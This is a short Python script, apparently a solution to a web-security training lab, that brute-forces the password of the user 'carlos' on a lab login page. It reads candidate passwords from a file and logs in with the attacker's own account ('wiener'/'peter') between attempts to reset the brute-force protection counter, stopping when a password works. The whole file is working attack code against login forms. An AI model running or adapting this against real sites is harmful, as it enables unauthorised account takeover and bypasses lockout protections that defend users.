import requests
import time

url = "https://0abb000f0489854980a4265a007b00fb.web-security-academy.net/login"

username = "carlos"

attacker_creds = {
    "username" : "wiener",
    "password" : "peter"
}

passwords = open("passwords.txt", "r").readlines()

i = 0
while(i < len(passwords)):
    if((i+1) % 2 == 0):
        content = requests.post(url, attacker_creds).content
        if(b"Your" in content):
            print("Proper login done")
    
    password = passwords[i].strip()
    data = {
        "username" : username,
        "password" : password
    }
    print(data)
    response = requests.post(url, data).content
    if(not b"Incorrect password" in response):
        print(f"Creds : {username}/{password}")
        break
    i += 1